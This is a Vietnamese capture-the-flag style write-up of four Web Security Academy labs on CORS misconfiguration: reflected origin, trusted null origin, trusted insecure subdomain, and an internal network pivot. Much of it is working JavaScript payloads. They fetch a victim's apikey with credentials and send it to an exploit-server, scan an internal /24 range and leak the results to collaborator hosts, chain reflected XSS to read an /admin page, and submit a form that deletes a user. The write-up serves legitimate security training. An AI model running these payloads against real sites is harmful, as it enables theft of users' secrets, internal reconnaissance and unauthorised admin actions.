## CORS vulnerability with basic origin reflection

Sau khi đăng nhập với account cho sẵn, tại trang /my-account ta xem được tên username kèm theo apikey. Trong đó, apikey được trích xuất từ /accountDetails bằng đoạn script như hình.
![image](https://hackmd.io/_uploads/H1zLsTztfe.png)
Kiểm tra request đến /accountDetails thì nó trả về thông tin user chứa apikey dựa theo session cookie và có header Access-Control-Allow-Credentials: true nên có thể suy ra nó hỗ trợ CORS.
![image](https://hackmd.io/_uploads/S1tFs6GKMg.png)
Nếu thêm Origin bất kì http://abc.com vào request, có thể thấy response có thêm Access-Control-Allow-Origin: http://abc.com → server trust origin từ request.
![image](https://hackmd.io/_uploads/HkasiaMtfl.png)
Dựa vào đó chỉ cần tạo payload sau:
```
<script>
    fetch('//<LAB-ID>.web-security-academy.net/accountDetails', {
        credentials:'include'
    })
    .then(r => r.json())
    .then(j => fetch('//exploit-<EXPLOIT-ID>.exploit-server.net/?apiKey=' + j.apikey))
</script>

```

\Cụ thể, do server trust origin bất kì từ request nên khi nạn nhân thực thi payload trên thì cross-site request từ trang exploit-server đến <LAB-DOMAIN>/accountDetails để lấy apikey sẽ thành công. apikey sau khi được lấy sẽ truyền về exploit-server của attacker dưới dạng tham số GET.

Truyền payload vào exploit-server.
![image](https://hackmd.io/_uploads/rkfyhTftzg.png)
    
## CORS vulnerability with trusted null origin
    
Trước khi đi vào writeup, ta sẽ xem các trường hợp mà Origin: null được sử dụng.
```
The Origin header value may be null in a number of cases, including (non-exhaustively):

- Origins whose scheme is not one of http, https, ftp, ws, wss, or gopher (including blob, file and data).
- Cross-origin images and media data, including that in <img>, <video> and <audio> elements.
- Documents created programmatically using createDocument(), generated from a data: URL, or that do not have a creator browsing context.
- Redirects across origins.
- iframes with a sandbox attribute that doesn't contain the value allow-same-origin.
- Responses that are network errors.
- Referrer-Policy set to no-referrer for non-cors request modes (e.g. simple form posts).

```
    
TƯơng tự bài trên, apikey của user cũng được trích xuất thông qua response từ /accountDetails.
![image](https://hackmd.io/_uploads/ry8P2TfYfx.png)
Xuất hiện header Access-Control-Allow-Credentials: true nên có thể suy ra server hỗ trợ CORS.
![image](https://hackmd.io/_uploads/ryCu3pMFfe.png)
Nếu thêm Origin bất kì http://abc.com vào request thì thấy server không trust origin bất kì từ request.
![image](https://hackmd.io/_uploads/BJk5nTzFze.png)
Tuy nhiên, khi thêm header Origin: null thì thấy response có header Access-Control-Allow-Origin: null. → server cấu hình cho phép Origin: null.
![image](https://hackmd.io/_uploads/BkWi36fKfe.png)
Khi đó, dựa vào các trường hợp mà Origin null được sử dụng ở trên, ta chọn 1 trường hợp là tag iframe với thuộc tính sandbox không chứa giá trị allow-same-origin. Payload được xây dựng như sau:
```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="data:text/html,<script>
    fetch('//<LAB-ID>.web-security-academy.net/accountDetails', {
        credentials:'include'
    }).then(r => r.json())
      .then(j => fetch('//exploit-<EXPLOIT-ID>.exploit-server.net/?apiKey=' + j.apikey))</script>">
</iframe>

```
Đoạn script như bài lab 1 sẽ được thực thi thông qua srcdoc và sandbox cần có giá trị allow-scripts để cho phép thực thi script đó.

Nhét payload vào exploit-server.
![image](https://hackmd.io/_uploads/BydTnpzYMg.png)
View-exploit và ta thấy iframe đã được render chứa script exploit.
![image](https://hackmd.io/_uploads/BJFC3pfFfe.png)
Kiểm tra thì đã thấy request trả về apikey về exploit-server.
![image](https://hackmd.io/_uploads/HyuyaaMtGe.png)
![image](https://hackmd.io/_uploads/H1IlaTGtMx.png)

## CORS vulnerability with trusted insecure protocols
Bài này nâng cấp hơn 2 bài trên khi nó chỉ trust tất cả subdomain. Như vậy mình cần tấn công CORS sao cho nạn nhân sẽ request đến target từ subdomain chứ không phải từ exploit-server.

apikey vẫn được lấy từ /accountDetails qua đoạn script dưới.
![image](https://hackmd.io/_uploads/S1KfTTGFMl.png)
![image](https://hackmd.io/_uploads/By7XpazFGl.png)
Một điểm chú ý là khi xem post sản phẩm bất kì thì xuất hiện chức năng Check stock, khi click sẽ thực hiện request đến 1 subdomain http://stock.<LAB-DOMAIN>/?productId=X&storeId=Y để trả về số sản phẩm còn trong kho.![image](https://hackmd.io/_uploads/H1ZEaaGYMx.png)
Thử thêm Origin: http://stock.<LAB-DOMAIN>/ thì thấy response trả về Allow-Control-Allow-Origin: http://stock.<LAB-DOMAIN>/ → server trust subdomain kể cả http và https. (Mặc dù server sử dụng https)

![image](https://hackmd.io/_uploads/SJbr6aMtMg.png)
Bây giờ ta sẽ đi tìm cách tấn công làm sao để nạn nhân sẽ request đến /accountDetails từ subdomain http://stock.<LAB-DOMAIN> chứ không phải từ exploit-server.

Thử query subdomain trên với productId sai thì thấy response trả lỗi chứa productId trên. Có vẻ như trang này sẽ bị dính reflected XSS.![image](https://hackmd.io/_uploads/SkArTaztze.png)
Thử payload <script>alert(1)</script> tại trường productId, ta thấy ta đã XSS thành công.
![image](https://hackmd.io/_uploads/HykwaaGtMg.png)
Như vậy, bây giờ chỉ cần truyền payload cors attack sau khi URL-encoded vào trường productId và khiến nạn nhân truy cập vào đường dẫn này thì nó sẽ thực thi payload từ subdomain nhờ XSS và request đến /accountDetails. Payload cors attack giống với lab 1:
```
<script>
    fetch('//<LAB-ID>.web-security-academy.net/accountDetails', {
          credentials:'include'
    })
    .then(r => r.json())
    .then(j => fetch('//exploit-<EXPLOIT-ID>.exploit-server.net/?apiKey=' + j.apikey))
</script>

```
URL Encode toàn bộ payload và truyền vào productId.
![image](https://hackmd.io/_uploads/SkfY6aMKGe.png)
Tại exploit-server, truyền payload sau:
```
<script>
   document.location = "http://stock.<LAB-DOMAIN>/?productId=<ENCODED-CORS-ATTACK>&storeId=1"
</script>

```
View exploit, ta thấy đã có request đến exploit-server chứa apikey.
![image](https://hackmd.io/_uploads/ryxnTpMtGl.png)

## CORS vulnerability with internal network pivot attack
Dựa vào mô tả đề bài, ứng dụng sử dụng CORS trust tất cả origin từ internal network. Ý tưởng là ta sẽ lợi dụng nạn nhân query đến một internal service khiến nó gửi các request đến ứng dụng thật.
Bước 1: Xác định internal endpoint
    - Ta sẽ sử dụng payload sau để bruteforce tìm địa chỉ internal service port 8080 nằm trong dải 192.168.0.0/24. Nếu tìm được đúng IP thì nó sẽ trả mã nguồn về collaborator mình đang control.
```
<script>
var q = [], collaboratorURL = 'http://lh6a3jy61r4vwcmoze5hj6s34uaky9.oastify.com';

for(i=1;i<=255;i++) {
	q.push(function(url) {
		return function(wait) {
			fetchUrl(url, wait);
		}
	}('http://192.168.0.'+i+':8080'));
}

for(i=1;i<=20;i++){
	if(q.length)q.shift()(i*100);
}

function fetchUrl(url, wait) {
	var controller = new AbortController(), signal = controller.signal;
	fetch(url, {signal}).then(r => r.text().then(text => {
		location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now();
	}))
	.catch(e => {
		if(q.length) {
			q.shift()(wait);
		}
	});
	setTimeout(x => {
		controller.abort();
		if(q.length) {
			q.shift()(wait);
		}
	}, wait);
}
</script>

```
Lưu payload vào exploit-server rồi Deliver exploit to victim. Kết quả địa chỉ IP của internal service cần tìm là 192.168.0.120:8080.
    ![image](https://hackmd.io/_uploads/BkY1ATGKGl.png)
Decode mã nguồn trả về ta thấy ứng dụng internal này có form login tại http://192.168.0.120:8080/login.

![image](https://hackmd.io/_uploads/H1MbRaMFfx.png)
Bước 2: Thử login ứng dụng internal bằng payload sau và xem response trả về.
```
<script>
var collaboratorURL = 'http://nof6flrcnnq19pruqsfk78dgu704ot.oastify.com';

function fetchUrl(url) {
	fetch(url).then(r => r.text().then(text => {
		location = collaboratorURL + '?code='+encodeURIComponent(text);
	}))
}

fetchUrl('http://192.168.0.120:8080/login?username=test&password=test');
</script>

```
Có thể thấy mặc dù account đăng nhập sai nhưng username vẫn được giữ vào form input. Nhìn có vẻ Reflected XSS.
![image](https://hackmd.io/_uploads/BJg4A6zKMg.png)
Bước 3: Detect XSS
    - Truyền payload XSS vào username : "><img src='+collaboratorURL+'?foundXSS=1>. Nếu XSS thành công thì sẽ có request đến collaborator chứa tham số foundXSS=1.

Tạo payload tương tự bước 2:
```
<script>
function xss(url, text, vector) {
	location = url + '/login?username='+encodeURIComponent(vector)+'&password=test';
}

function fetchUrl(url, collaboratorURL){
	fetch(url).then(r => r.text().then(text => {
		xss(url, text, '"><img src='+collaboratorURL+'?foundXSS=1>');
	}))
}

fetchUrl("http://192.168.0.120:8080", "http://6dkz8uuawuy6xchmqu3gobapvg16pv.oastify.com");
</script>

```
Deliver exploit to victim, ta nhận được request như mong muốn → interal endpoint /login bị dính XSS.
![image](https://hackmd.io/_uploads/HkELA6MYMe.png)
Bước 4: Tận dụng XSS của internal service đó để truy cập trang /admin của ứng dụng hiện tại do ứng dụng trust tất cả các origin từ internal network.
Payload XSS sẽ là load 1 frame của trang /admin và trả mã HTML về collaborator.
```
<script>
function xss(url, text, vector) {
	location = url + '/login?username='+encodeURIComponent(vector)+'&password=test';
}

function fetchUrl(url, collaboratorURL){
	fetch(url).then(r => r.text().then(text => {
		xss(url, text, '"><iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">');
	}))
}

fetchUrl("http://192.168.0.120:8080", "http://ceuq935wefzl05596lk2rx3ea5gw4l.oastify.com");
</script>

```
Gửi payload cho nạn nhân qua exploit-server, ta nhận được request trả về chứa mã nguồn HTML trang /admin. Ta thấy có 1 form post đến /admin/delete để delete user theo username bất kì.
![image](https://hackmd.io/_uploads/BkAu06fFGx.png)
Bước 5: Delete carlos
Payload XSS sẽ set value tại input username là carlos và thực hiện submit form delete user trên.
```
<script>
function xss(url, text, vector) {
	location = url + '/login?username='+encodeURIComponent(vector)+'&password=test';
}

function fetchUrl(url){
	fetch(url).then(r => r.text().then(text => {
		xss(url, text, '"><iframe src=/admin onload="var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\'carlos\',f.submit()">');
	}))
}

fetchUrl("http://192.168.0.120:8080");
</script>

```
Deliver exploit to victim và ta solve được challenge.